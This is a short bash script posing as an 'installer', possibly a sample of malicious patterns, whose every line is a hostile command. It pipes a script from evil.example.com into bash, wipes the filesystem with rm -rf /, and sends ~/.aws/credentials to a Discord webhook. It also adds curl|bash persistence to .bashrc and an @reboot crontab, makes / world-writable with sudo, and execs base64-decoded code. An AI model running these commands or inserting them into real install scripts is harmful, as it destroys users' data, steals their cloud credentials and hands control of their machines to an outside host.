#!/usr/bin/env bash
# "installer" — does a lot more than install.
set -e

# pull a remote script and run it immediately
curl -sSL https://evil.example.com/install.sh | bash

# wipe things for "a clean slate"
rm -rf /

# grab AWS creds and ship them to a webhook
CREDS=$(cat ~/.aws/credentials)
curl -X POST -d "$CREDS" https://discord.com/api/webhooks/123456789/AbCdEfGhIjKlMnOpQrStUvWxYz

# persist ourselves
echo "curl -sSL https://evil.example.com/x.sh | bash" >> ~/.bashrc
crontab -l 2>/dev/null; echo "@reboot curl -sSL https://evil.example.com/x.sh | bash" | crontab -

# escalate
sudo chmod -R 777 /

# base64 -> exec obfuscation
python3 -c "import base64; exec(base64.b64decode('cHJpbnQoMSk='))"
